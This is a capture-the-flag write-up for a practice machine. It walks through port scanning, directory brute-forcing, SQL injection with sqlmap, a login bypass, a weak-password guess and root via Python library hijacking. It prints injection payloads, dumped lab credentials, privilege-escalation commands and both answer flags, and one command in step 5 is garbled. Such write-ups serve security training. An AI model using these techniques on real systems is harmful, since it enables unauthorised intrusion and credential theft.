# Biblioteca


1. Run a port scan.
```
root@ip-10-10-121-133:~# rustscan -r 1-65535 -a 10.10.125.240
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.125.240:22
Open 10.10.125.240:8000
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.80 ( https://nmap.org ) at 2022-07-02 05:39 UTC
Initiating Ping Scan at 05:39
Scanning 10.10.125.240 [2 ports]
Completed Ping Scan at 05:39, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 05:39
Completed Parallel DNS resolution of 1 host. at 05:39, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 1, NX: 0, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 05:39
Scanning ip-10-10-125-240.eu-west-1.compute.internal (10.10.125.240) [2 ports]
Discovered open port 22/tcp on 10.10.125.240
Discovered open port 8000/tcp on 10.10.125.240
Completed Connect Scan at 05:39, 0.00s elapsed (2 total ports)
Nmap scan report for ip-10-10-125-240.eu-west-1.compute.internal (10.10.125.240)
Host is up, received conn-refused (0.00067s latency).
Scanned at 2022-07-02 05:39:01 UTC for 0s

PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack
8000/tcp open  http-alt syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds
```

2. Brute force directories with gobuster.
```
root@ip-10-10-121-133:~# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.125.240:8000/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.125.240:8000/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2022/07/02 06:39:51 Starting gobuster
===============================================================
/login (Status: 200)
/logout (Status: 302)
/register (Status: 200)
===============================================================
2022/07/02 06:40:01 Finished
===============================================================
```

3. Run sqlmap on the login form.
```
root@ip-10-10-121-133:~# sqlmap --url=http://10.10.125.240:8000/login --data="username=bob&password=bob" --method POST --dbs
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.2.4#stable}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 06:48:37

[06:48:37] [INFO] testing connection to the target URL
[06:48:37] [INFO] testing if the target URL content is stable
[06:48:38] [INFO] target URL content is stable
[06:48:38] [INFO] testing if POST parameter 'username' is dynamic
[06:48:38] [INFO] confirming that POST parameter 'username' is dynamic
[06:48:38] [INFO] POST parameter 'username' is dynamic
[06:48:38] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[06:48:38] [INFO] testing for SQL injection on POST parameter 'username'
[06:48:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[06:48:39] [INFO] POST parameter 'username' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Hi")
[06:48:39] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[06:48:44] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[06:48:44] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[06:48:44] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[06:48:44] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[06:48:44] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[06:48:44] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[06:48:44] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[06:48:44] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[06:48:44] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[06:48:44] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[06:48:44] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[06:48:44] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[06:48:44] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[06:48:44] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[06:48:44] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[06:48:44] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[06:48:44] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[06:48:44] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[06:48:44] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[06:48:44] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[06:48:44] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[06:48:44] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[06:48:44] [INFO] testing 'MySQL inline queries'
[06:48:44] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
[06:48:44] [INFO] testing 'MySQL > 5.0.11 stacked queries'
[06:48:44] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP - comment)'
[06:48:44] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP)'
[06:48:44] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[06:48:44] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[06:48:44] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[06:48:54] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable
[06:48:54] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[06:48:54] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[06:48:54] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[06:48:54] [INFO] target URL appears to have 4 columns in query
[06:48:55] [INFO] POST parameter 'username' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
[06:48:57] [INFO] testing if POST parameter 'password' is dynamic
[06:48:57] [INFO] confirming that POST parameter 'password' is dynamic
[06:48:57] [INFO] POST parameter 'password' is dynamic
[06:48:57] [WARNING] heuristic (basic) test shows that POST parameter 'password' might not be injectable
[06:48:57] [INFO] testing for SQL injection on POST parameter 'password'
[06:48:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[06:48:57] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[06:48:57] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[06:48:57] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[06:48:57] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[06:48:57] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[06:48:57] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[06:48:57] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[06:48:57] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[06:48:57] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[06:48:57] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[06:48:57] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[06:48:57] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[06:48:57] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[06:48:58] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[06:48:58] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[06:48:58] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[06:48:58] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[06:48:58] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[06:48:58] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[06:48:58] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[06:48:58] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[06:48:58] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[06:48:58] [INFO] testing 'MySQL inline queries'
[06:48:58] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
[06:48:58] [INFO] testing 'MySQL > 5.0.11 stacked queries'
[06:48:58] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP - comment)'
[06:48:58] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP)'
[06:48:58] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[06:48:58] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[06:48:58] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[06:49:08] [INFO] POST parameter 'password' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable
[06:49:08] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[06:49:08] [INFO] POST parameter 'password' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'password' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 105 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=bob' AND 2206=2206 AND 'Jhos'='Jhos&password=bob

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: username=bob' AND SLEEP(5) AND 'UCgt'='UCgt&password=bob

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: username=-2909' UNION ALL SELECT NULL,CONCAT(0x7178786b71,0x6363574f515748516346635852537155654f65436e41634b446a6c485a6e6b466d527a546a434757,0x71716a7871),NULL,NULL-- XxyW&password=bob

Parameter: password (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=bob&password=bob' AND 1039=1039 AND 'FlSj'='FlSj

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: username=bob&password=bob' AND SLEEP(5) AND 'xphM'='xphM

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: username=bob&password=-9794' UNION ALL SELECT NULL,CONCAT(0x7178786b71,0x4f576c724c58634c4e416667646d4954745053584a567677646466694f775671777a667746755870,0x71716a7871),NULL,NULL-- GhtC
---
there were multiple injection points, please select the one to use for following injections:
[0] place: POST, parameter: username, type: Single quoted string (default)
[1] place: POST, parameter: password, type: Single quoted string
[q] Quit
>
[06:49:38] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[06:49:38] [INFO] fetching database names
[06:49:38] [INFO] used SQL query returns 2 entries
[06:49:38] [INFO] retrieved: information_schema
[06:49:38] [INFO] retrieved: website
available databases [2]:
[*] information_schema
[*] website

[06:49:38] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 45 times
[06:49:38] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.125.240'

[*] shutting down at 06:49:38
```

4. Use `admin' or '1'='1` in the username and password fields and find that we're logged in as the user `smokey`.

5. Use `sqlmap --url=http://10.10.125.240:8000/login --data="usroot@ip-10-10-121-133:~# sqlmap --url=http://10.10.125.240:8000/login --data="username=bob&password=bob" --method POST --dbms=MySQL --dump-all` to dump database.
```
Database: website
Table: users
[2 entries]
+----+-------------------+----------+----------------+
| id | email             | username | password       |
+----+-------------------+----------+----------------+
| 1  | smokey@email.boop | smokey   | My_P@ssW0rd123 |
| 2  | bob@bob.bob       | bob      | bob            |
+----+-------------------+----------+----------------+
```

6. Download and run LinPeas on the machine. We see that there's another user `hazel` with `user.txt` and `hasher.py` in their home directory, but we can't access it.

7. The hint for `user.txt` says that `hazel`'s password is very weak. I tried running hydra with rockyou.txt, but it didn't work. Then I tried `hazel`:`hazel` and it worked. The flag in `user.txt` is `THM{G0Od_OLd_SQL_1nj3ct10n_&_w3@k_p@sSw0rd$}`.

8. Running `sudo -l` shows that `hazel` can run `hasher.py` as root.
```
hazel@biblioteca:~$ sudo -l
Matching Defaults entries for hazel on biblioteca:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hazel may run the following commands on biblioteca:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /home/hazel/hasher.py
```

9. Read the [Python Library Hijacking article](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8) and use the third technique. Create a file called `hashlib.py` in `/tmp` insert `import pty; pty.spawn("/bin/bash")` inside it. Then run `sudo -u root PYTHONPATH=/tmp/ /usr/bin/python3 /home/hazel/hasher.py` to get a root shell. The `root.txt` flag is `THM{PytH0n_LiBr@RY_H1j@acKIn6}`.
